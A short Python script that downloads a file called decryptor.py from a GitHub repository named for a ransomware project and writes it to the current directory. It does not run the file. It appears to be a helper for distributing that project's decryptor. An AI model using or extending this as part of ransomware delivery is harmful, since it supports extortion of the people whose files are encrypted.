import requests, os

def download(dst, path):
    r = requests.get(path)
    open(dst, 'wb').write(r.content)

download_dir = os.getcwd()+ '/decryptor.py'
download(dst=download_dir, path='https://raw.githubusercontent.com/Alejopadido/4l3j0_ransomware/main/decryptor.py')